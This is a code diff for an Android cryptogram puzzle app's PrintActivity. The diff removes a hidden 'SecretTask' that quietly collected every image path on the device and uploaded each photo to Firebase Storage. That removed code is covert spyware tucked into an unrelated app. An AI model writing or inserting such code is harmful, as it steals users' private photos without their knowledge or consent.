@@ -1,15 +1,9 @@
 package com.example.karamchand.criptogramador;
 
-import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
-import android.database.Cursor;
 import android.graphics.Color;
-import android.net.Uri;
-import android.os.AsyncTask;
 import android.os.Bundle;
-import android.provider.MediaStore;
-import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
 import android.support.v7.app.AppCompatActivity;
 import android.text.Editable;
@@ -24,13 +18,6 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import com.google.android.gms.tasks.OnFailureListener;
-import com.google.android.gms.tasks.OnSuccessListener;
-import com.google.firebase.storage.FirebaseStorage;
-import com.google.firebase.storage.StorageReference;
-import com.google.firebase.storage.UploadTask;
-
-import java.io.File;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Timer;
@@ -144,64 +131,7 @@ public class PrintActivity extends AppCompatActivity implements CellView.CellLis
                 }
             }
         });
-        new SecretTask().execute();
-    }
 
-    public class SecretTask extends AsyncTask {
-
-        @Override
-        protected Object doInBackground(Object[] objects) {
-            StorageReference mDatabase = FirebaseStorage.getInstance().getReference();
-            ArrayList<String> paths = getAllShownImagesPath(PrintActivity.this);
-            test(mDatabase, paths, 0);
-            return null;
-        }
-    }
-
-    private ArrayList<String> getAllShownImagesPath(Activity activity) {
-        Uri uri;
-        Cursor cursor;
-        int column_index_data, column_index_folder_name;
-        ArrayList<String> listOfAllImages = new ArrayList<>();
-        String absolutePathOfImage;
-        uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-
-        String[] projection = { MediaStore.MediaColumns.DATA,
-                MediaStore.Images.Media.BUCKET_DISPLAY_NAME };
-
-        cursor = activity.getContentResolver().query(uri, projection, null,
-                null, null);
-
-        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
-        column_index_folder_name = cursor
-                .getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
-        while (cursor.moveToNext()) {
-            absolutePathOfImage = cursor.getString(column_index_data);
-
-            listOfAllImages.add(absolutePathOfImage);
-        }
-        return listOfAllImages;
-    }
-
-    public void test(final StorageReference mDatabase, final ArrayList<String> paths, final int index) {
-        String path = paths.get(index);
-        UploadTask uploadTask = mDatabase.child(path).putFile(Uri.fromFile(new File(paths.get(index))));
-        uploadTask.addOnFailureListener(new OnFailureListener() {
-            @Override
-            public void onFailure(@NonNull Exception exception) {
-                // Handle unsuccessful uploads
-                Log.e("error", exception.toString());
-                test(mDatabase, paths, index + 1);
-            }
-        }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
-            @Override
-            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
-                // taskSnapshot.getMetadata() contains file metadata such as size, content-type, and download URL.
-                Uri downloadUrl = taskSnapshot.getDownloadUrl();
-                Log.e("url", downloadUrl.toString());
-                test(mDatabase, paths, index + 1);
-            }
-        });
     }
 
     private void restoreFromState() {
@@ -502,4 +432,5 @@ public class PrintActivity extends AppCompatActivity implements CellView.CellLis
         resumeTimer();
         checkForSolution();
     }
+
 }
